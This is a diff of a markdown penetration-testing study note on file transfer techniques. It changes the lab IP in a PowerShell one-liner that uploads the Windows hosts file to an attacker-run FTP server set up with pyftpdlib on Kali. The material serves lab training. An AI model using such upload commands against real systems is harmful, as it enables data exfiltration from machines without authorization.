@@ -127,7 +127,7 @@ Harmj0y has compiled an extensive list of PowerShell download cradles [here](htt
 - Setup on Kali:
 	- `python3 -m pyftpdlib --port 21 --write`
 - PowerShell upload function to upload a file to our FTP Server:
-	- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
+	- `(New-Object Net.WebClient).UploadFile('ftp://10.10.15.93/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
 	![[Pasted image 20250622070910.png]]
 
 # **Labs**
